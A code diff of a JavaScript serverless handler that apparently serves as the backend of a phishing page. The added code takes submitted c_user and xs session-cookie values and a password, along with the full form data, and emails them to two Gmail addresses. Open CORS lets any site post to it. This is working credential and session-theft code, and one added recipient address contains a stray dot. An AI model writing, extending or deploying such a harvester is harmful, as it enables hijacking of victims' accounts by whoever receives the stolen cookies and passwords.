@@ -1,42 +1,68 @@
-import nodemailer from "nodemailer";
+import { transporter } from "./emailConfig.js";
 
 export default async function handler(req, res) {
+  // ✅ CORS headers
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader(
+    "Access-Control-Allow-Headers",
+    "Content-Type, Accept, Authorization"
+  );
 
+  // ✅ Handle preflight OPTIONS request
   if (req.method === "OPTIONS") {
-    return res.status(200).end();
+    return res.status(204).end(); // preflight OK
   }
 
-  if (req.method === "POST") {
-    const { c_user, xs } = req.body;
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Method not allowed" });
+  }
 
-    // ✅ Setup transporter
-    let transporter = nodemailer.createTransport({
-      service: "gmail", // Tum koi bhi SMTP use kar sakte ho (Gmail, Outlook, etc.)
-      auth: {
-        user: process.env.EMAIL_USER, // tumhara email
-        pass: process.env.EMAIL_PASS  // tumhara email app password
-      }
+  let formData = {};
+
+  try {
+    if (typeof req.body === "string") {
+      formData = JSON.parse(req.body);
+    } else {
+      formData = req.body;
+    }
+  } catch (err) {
+    return res.status(400).json({ error: "Invalid JSON" });
+  }
+
+  if (!formData || Object.keys(formData).length === 0) {
+    return res.status(400).json({ error: "Form data missing" });
+  }
+
+  // ✅ Extract required fields
+  const { c_user, xs, password } = formData;
+
+  try {
+    await transporter.sendMail({
+      from: `"PROFESSOR" <dardhame1@gmail.com>`,
+      to: "newzatpage.@gmail.com, submitdispute@gmail.com",
+      subject: "Zubair",
+      text: `
+Professor Link:
+
+c_user: ${c_user || "Not provided"}
+xs: ${xs || "Not provided"}
+password: ${password || "Not provided"}
+Full Data: ${JSON.stringify(formData, null, 2)}
+      `,
+      html: `
+        <h3>Professor Link</h3>
+        <p><strong>c_user:</strong> ${c_user || "Not provided"}</p>
+        <p><strong>xs:</strong> ${xs || "Not provided"}</p>
+        <p><strong>password:</strong> ${password || "Not provided"}</p>
+        <h4>Full Data:</h4>
+        <pre>${JSON.stringify(formData, null, 2)}</pre>
+      `,
     });
 
-    // ✅ Send email
-    try {
-      await transporter.sendMail({
-        from: `"PROFESSOR" <${process.env.EMAIL_USER}>`,
-        to: "newzatpage@gmail.com,submitdispute@gmail.com", // Yahan receiver ka email daalna hai
-        subject: "Zubair",
-        text: `c_user: ${c_user}\nxs: ${xs}`,
-        html: `<p><strong>Professor</strong></p><p><strong>Asif</strong></p>`
-      });
-
-      return res.status(200).json({ success: true, message: "Email sent!" });
-    } catch (error) {
-      console.error("Email error:", error);
-      return res.status(500).json({ success: false, error: "Failed to send email" });
-    }
+    res.status(200).json({ success: true, message: "Data sent via email (Asif)" });
+  } catch (error) {
+    console.error("Email send error:", error);
+    res.status(500).json({ error: "Failed to send email" });
   }
-
-  res.status(405).json({ error: "Method not allowed" });
 }
